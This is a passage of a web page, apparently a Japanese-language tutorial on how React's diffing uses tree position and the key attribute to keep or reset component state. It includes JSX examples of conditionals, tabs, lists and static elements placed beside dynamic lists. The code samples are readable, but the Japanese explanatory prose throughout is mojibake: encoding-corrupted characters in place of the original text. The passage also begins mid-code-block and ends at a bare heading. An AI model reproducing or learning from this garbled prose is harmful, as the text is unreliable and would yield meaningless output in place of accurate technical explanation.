</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">div</code>ãŒ<code class="language-text">span</code>ã«å¤‰ã‚ã£ãŸãŸã‚ã€Reactã¯å¤ã„ãƒ„ãƒªãƒ¼ã®å…¨ä½“ï¼ˆ<code class="language-text">Counter</code>ã‚’å«ã‚€ï¼‰ã‚’ç ´å£Šã—ã€æ–°ã—ã„ãƒ„ãƒªãƒ¼ã‚’ã‚¼ãƒ­ã‹ã‚‰æ§‹ç¯‰ã—ã¾ã™ã€‚</p>
<h3>2. ãƒ„ãƒªãƒ¼å†…ã®ä½ç½®ã¯é‡è¦</h3>
<p>Reactã®å·®åˆ†æ¤œå‡ºã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã¯ã€ãƒ„ãƒªãƒ¼æ§‹é€ å†…ã«ãŠã‘ã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ä½ç½®ã«å¤§ããä¾å­˜ã—ã¾ã™ã€‚ä½ç½®ã¯ã€å·®åˆ†ã‚’æ¯”è¼ƒã™ã‚‹éš›ã«è­˜åˆ¥æƒ…å ±ã‚’ç¤ºã™ä¸»ãªè¦å› ã¨ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// Let's pretend showDetails is true: Render UserProfile</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">{</span>showDetails <span class="token operator">?</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">UserProfile</span></span> <span class="token attr-name">userId</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token number">123</span><span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span> <span class="token operator">:</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">LoginPrompt</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">}</span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>

<span class="token comment">// Let's pretend showDetails is false: Render LoginPrompt instead</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">{</span>showDetails <span class="token operator">?</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">UserProfile</span></span> <span class="token attr-name">userId</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token number">123</span><span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span> <span class="token operator">:</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">LoginPrompt</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">}</span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®æ¡ä»¶å¼ã®ä¾‹ã§ã¯ã€Reactã¯ãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã®æœ€åˆã®å­ã®ä½ç½®ã‚’ä¸€ã¤ã®ã€Œã‚¹ãƒ­ãƒƒãƒˆã€ã¨ã—ã¦æ‰±ã„ã¾ã™ã€‚<code class="language-text">showDetails</code>ãŒ<code class="language-text">true</code>ã‹ã‚‰<code class="language-text">false</code>ã«å¤‰ã‚ã‚‹ã¨ã€Reactã¯ãã‚Œãã‚Œã®ãƒ¬ãƒ³ãƒ€ãƒ¼çµæœã®åŒã˜ä½ç½®ã«ã‚ã‚‹æƒ…å ±ã‚’æ¯”è¼ƒã—ã€ãã“ã«ã¯ç•°ãªã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚¿ã‚¤ãƒ—ï¼ˆ<code class="language-text">UserProfile</code> vs <code class="language-text">LoginPrompt</code>ï¼‰ãŒã‚ã‚Šã¾ã™ã€‚ãƒã‚¸ã‚·ãƒ§ãƒ³1ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚¿ã‚¤ãƒ—ãŒå¤‰ã‚ã£ãŸãŸã‚ã€Reactã¯å¤ã„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã™ã¹ã¦ï¼ˆstateã‚‚å«ã‚ã¦ï¼‰ã‚¢ãƒ³ãƒã‚¦ãƒ³ãƒˆã—ã€æ–°ã—ã„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ãƒã‚¦ãƒ³ãƒˆã—ã¾ã™ã€‚</p>
<p>ã“ã®ãƒã‚¸ã‚·ãƒ§ãƒ³ãƒ™ãƒ¼ã‚¹ã®è­˜åˆ¥æƒ…å ±ã¯ã€ã‚‚ã£ã¨ã‚·ãƒ³ãƒ—ãƒ«ãªã‚±ãƒ¼ã‚¹ã§ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒstateã‚’ä¿æŒã™ã‚‹ç†ç”±ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// Before</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">{</span>isPrimary <span class="token operator">?</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">UserProfile</span></span> <span class="token attr-name">userId</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token number">123</span><span class="token punctuation">}</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>primary<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
  <span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">UserProfile</span></span> <span class="token attr-name">userId</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token number">456</span><span class="token punctuation">}</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>secondary<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®ä¾‹ã§ã¯ã€<code class="language-text">isPrimary</code>ã®å€¤ã«ã‹ã‹ã‚ã‚‰ãšã€åŒã˜ä½ç½®ã«åŒã˜ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚¿ã‚¤ãƒ—ï¼ˆ<code class="language-text">UserProfile</code>ï¼‰ãŒã‚ã‚Šã¾ã™ã€‚Reactã¯ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å†ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ã®ã§ã¯ãªãã€ã‚·ãƒ³ãƒ—ãƒ«ã«propsã‚’æ›´æ–°ã—ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ä¿æŒã—ã¾ã™ã€‚</p>
<p>ã“ã®ãƒã‚¸ã‚·ãƒ§ãƒ³ãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ã»ã¨ã‚“ã©ã®ã‚·ãƒŠãƒªã‚ªã§æœ‰åŠ¹ã§ã™ãŒã€ä»¥ä¸‹ã®å ´åˆã«ã¯å•é¡ŒãŒç”Ÿã˜ã¾ã™ã€‚</p>
<ol>
<li>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ä½ç½®ãŒå‹•çš„ã«ç§»å‹•ã™ã‚‹ï¼ˆãƒªã‚¹ãƒˆã®ã‚½ãƒ¼ãƒˆæ™‚ãªã©ï¼‰</li>
<li>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ä½ç½®ãŒå¤‰ã‚ã‚‹å ´åˆã«stateã‚’ä¿æŒã™ã‚‹å¿…è¦ãŒã‚ã‚‹</li>
<li>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å†ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã‚’æ­£ç¢ºã«åˆ¶å¾¡ã—ãŸã„</li>
</ol>
<p>ã“ã“ã§æ´»èºã™ã‚‹ã®ãŒReactã®keyã‚·ã‚¹ãƒ†ãƒ ã§ã™ã€‚</p>
<h3>3. keyã¯ãƒã‚¸ã‚·ãƒ§ãƒ³ãƒ™ãƒ¼ã‚¹ã®æ¯”è¼ƒã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã™ã‚‹</h3>
<p>ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã¯ã€<code class="language-text">key</code>å±æ€§ã«ã‚ˆã‚Šã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®è­˜åˆ¥æƒ…å ±ã‚’æ˜ç¢ºã«åˆ¶å¾¡ã—ã€Reactã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå‹•ä½œã§ã‚ã‚‹ä½ç½®ã«åŸºã¥ãè­˜åˆ¥ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">TabContent</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> activeTab<span class="token punctuation">,</span> tabs <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token punctuation">{</span>tabs<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">tab</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>
        <span class="token comment">// Key overrides position-based comparison</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>tab<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
          </span><span class="token punctuation">{</span>activeTab <span class="token operator">===</span> tab<span class="token punctuation">.</span>id <span class="token operator">?</span> <span class="token punctuation">(</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">UserProfile</span></span>
              <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active-profile<span class="token punctuation">"</span></span>
              <span class="token attr-name">userId</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>tab<span class="token punctuation">.</span>userId<span class="token punctuation">}</span></span>
              <span class="token attr-name">role</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>tab<span class="token punctuation">.</span>role<span class="token punctuation">}</span></span>
            <span class="token punctuation">/></span></span>
          <span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>placeholder<span class="token punctuation">"</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>placeholder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
              Select this tab to view </span><span class="token punctuation">{</span>tab<span class="token punctuation">.</span>userId<span class="token punctuation">}</span><span class="token plain-text">'s profile
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
          <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>æ¡ä»¶å¼ã®ãƒ¬ãƒ³ãƒ€ãƒ¼çµæœã¨ã—ã¦<code class="language-text">UserProfile</code>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒç•°ãªã‚‹ä½ç½®ã«ãã‚‹å ´åˆã§ã‚‚ã€Reactã¯åŒã˜keyã‚’æŒã¤ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’åŒã˜ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¨ã—ã¦æ‰±ã„ã¾ã™ã€‚ã‚¿ãƒ–ãŒæœ‰åŠ¹ã«ãªã‚‹ã¨ã€ã€Œactive-profileã€keyãŒå¤‰ã‚ã‚‰ãªã„ãŸã‚Reactã¯ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®stateã‚’ä¿æŒã—ã€ãã®çµæœã€ã‚¿ãƒ–ã®åˆ‡ã‚Šæ›¿ãˆã‚’ã‚¹ãƒ ãƒ¼ã‚ºã«è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ã“ã®ä¾‹ã¯ã€ãƒ¬ãƒ³ãƒ€ãƒ¼ãƒ„ãƒªãƒ¼æ§‹é€ ä¸Šã®ä½ç½®ã«ã‹ã‹ã‚ã‚‰ãšã€keyã‚’ç”¨ã„ã‚‹ã“ã¨ã§ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®è­˜åˆ¥æƒ…å ±ã‚’ã„ã‹ã«ã—ã¦ç¶­æŒã§ãã‚‹ã‹ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚keyã¯ã€Reactã«ã‚ˆã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆéšå±¤æ§‹é€ ã®å·®åˆ†æ¤œå‡ºã‚’åˆ¶å¾¡ã™ã‚‹å¼·åŠ›ãªæ‰‹æ®µã‚’ä¸ãˆã¦ãã‚Œã¾ã™ã€‚</p>
<h2>keyã®é­”æ³•</h2>
<p>keyã¯ä¸»ã«ãƒªã‚¹ãƒˆã«ãŠã‘ã‚‹å½¹å‰²ã§çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ãŒã€Reactã®å·®åˆ†æ¤œå‡ºãƒ—ãƒ­ã‚»ã‚¹ã«ä¸ãˆã‚‹å½±éŸ¿ã¯ãã‚Œã ã‘ã«ã¨ã©ã¾ã‚Šã¾ã›ã‚“ã€‚</p>
<h3>keyãŒãƒªã‚¹ãƒˆã«å¿…è¦ã§ã‚ã‚‹ç†ç”±</h3>
<p>ãƒªã‚¹ãƒˆã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹éš›ã€Reactã¯keyã‚’ç”¨ã„ã¦é …ç›®ã®è¿½åŠ ã€å‰Šé™¤ã€ä¸¦ã¹æ›¿ãˆã‚’æŠŠæ¡ã—ã¦ã„ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">{</span>items<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>text<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>keyãŒãªã‘ã‚Œã°ã€Reactã¯é…åˆ—ä¸Šã®è¦ç´ ã®ä½ç½®ã ã‘ã«é ¼ã‚‰ãªãã¦ã¯ãªã‚Šã¾ã›ã‚“ã€‚å…ˆé ­ã«æ–°ã—ã„é …ç›®ã‚’æŒ¿å…¥ã—ãŸå ´åˆã€Reactã¯ã™ã¹ã¦ã®è¦ç´ ã®ä½ç½®ãŒå¤‰ã‚ã£ãŸã¨ã¿ãªã—ã€ãƒªã‚¹ãƒˆå…¨ä½“ã‚’å†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã—ã¾ã™ã€‚</p>
<p>keyãŒã‚ã‚Œã°ã€Reactã¯ä½ç½®ã«ã‹ã‹ã‚ã‚‰ãšãƒ¬ãƒ³ãƒ€ãƒ¼é–“ã®è¦ç´ ã‚’ç…§åˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<h3>é…åˆ—ä»¥å¤–ã®keyï¼Ÿ</h3>
<p>Reactã¯ã€é™çš„è¦ç´ ã«å¯¾ã—ã¦keyã®è¿½åŠ ã‚’å¼·è¦ã—ã¾ã›ã‚“ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// No keys needed</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Input</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Input</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚Œã¯ã€ReactãŒã“ã‚Œã‚‰ã®è¦ç´ ãŒé™çš„ã§ã‚ã‚‹ã“ã¨ã‚’çŸ¥ã£ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚ã¤ã¾ã‚Šã€ãƒ„ãƒªãƒ¼ä¸Šã®è¦ç´ ã®ä½ç½®ãŒäºˆæ¸¬å¯èƒ½ã ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>ã—ã‹ã—ã€keyã¯ãƒªã‚¹ãƒˆã®å¤–ã§ã‚‚å¼·åŠ›ãªãƒ„ãƒ¼ãƒ«ã«ãªã‚Šå¾—ã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">Component</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>isReverse<span class="token punctuation">,</span> setIsReverse<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Input</span></span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>isReverse <span class="token operator">?</span> <span class="token string">"some-key"</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Input</span></span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token operator">!</span>isReverse <span class="token operator">?</span> <span class="token string">"some-key"</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">	
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">isReverse</code>ãŒåˆ‡ã‚Šæ›¿ã‚ã‚‹ã¨ã€2ã¤ã®å…¥åŠ›ã®é–“ã§<code class="language-text">'some-key'</code>ãŒç§»å‹•ã™ã‚‹ãŸã‚ã€Reactã¯ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®stateã‚’2ã¤ã®ä½ç½®ã®é–“ã§ã€Œç§»å‹•ã€ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<h3>å‹•çš„è¦ç´ ã¨é™çš„è¦ç´ ã‚’æ··åœ¨ã•ã›ã‚‹</h3>
<p>å‹•çš„ãƒªã‚¹ãƒˆã«é …ç›®ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€ãƒªã‚¹ãƒˆã®å¾Œã®é™çš„è¦ç´ ã®è­˜åˆ¥æƒ…å ±ãŒå¤‰ã‚ã‚‹ã®ã§ã¯ãªã„ã‹ã¨ã„ã†æ‡¸å¿µãŒã‚ˆãèã‹ã‚Œã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">{</span>items<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ListItem</span></span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">StaticElement</span></span> <span class="token punctuation">/></span></span><span class="token plain-text"> </span><span class="token punctuation">{</span><span class="token comment">/* Will this re-mount if items change? */</span><span class="token punctuation">}</span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Reactã¯ã“ã®å•é¡Œã«ã‚¹ãƒãƒ¼ãƒˆã«å¯¾å‡¦ã—ã¾ã™ã€‚å‹•çš„ãƒªã‚¹ãƒˆå…¨ä½“ã‚’æœ€åˆã®ä½ç½®ã§ã²ã¨ã¾ã¨ã¾ã‚Šã¨ã—ã¦æ‰±ã†ãŸã‚ã€ãƒªã‚¹ãƒˆã«å¤‰æ›´ãŒã‚ã£ã¦ã‚‚<code class="language-text">StaticElement</code>ã¯å¸¸ã«åŒã˜ä½ç½®ã¨è­˜åˆ¥æƒ…å ±ãŒä¿ãŸã‚Œã¾ã™ã€‚</p>
<p>Reactå†…éƒ¨ã§ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«è¡¨ç¾ã•ã‚Œã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">[</span>
  <span class="token comment">// The entire dynamic array becomes a single child</span>
  <span class="token punctuation">[</span>
    <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> ListItem<span class="token punctuation">,</span> <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">"1"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> ListItem<span class="token punctuation">,</span> <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">"2"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> StaticElement <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// Always maintains its second position</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ãƒªã‚¹ãƒˆã«é …ç›®ã‚’è¿½åŠ ã¾ãŸã¯å‰Šé™¤ã—ã¦ã‚‚ã€<code class="language-text">StaticElement</code>ã¯è¦ªé…åˆ—ã®ãƒã‚¸ã‚·ãƒ§ãƒ³2ã®ã¾ã¾å¤‰ã‚ã‚Šã¾ã›ã‚“ã€‚ã¤ã¾ã‚Šã€ãƒªã‚¹ãƒˆã«å¤‰æ›´ãŒåŠ ãˆã‚‰ã‚Œã¦ã‚‚å†ãƒã‚¦ãƒ³ãƒˆã•ã‚Œãªã„ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã“ã®ã‚¹ãƒãƒ¼ãƒˆãªä»•çµ„ã¿ã«ã‚ˆã‚Šã€éš£æ¥ã™ã‚‹å‹•çš„ãƒªã‚¹ãƒˆã®å¤‰æ›´ã«ã‚ˆã£ã¦é™çš„è¦ç´ ãŒä¸å¿…è¦ã«å†ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã‚‹ã“ã¨ãŒãªãã€å‡¦ç†ãŒæœ€é©åŒ–ã•ã‚Œã¾ã™ã€‚</p>
<h3>3. DOMã‚’æˆ¦ç•¥çš„ã«åˆ¶å¾¡ã™ã‚‹ãŸã‚ã®key</h3>
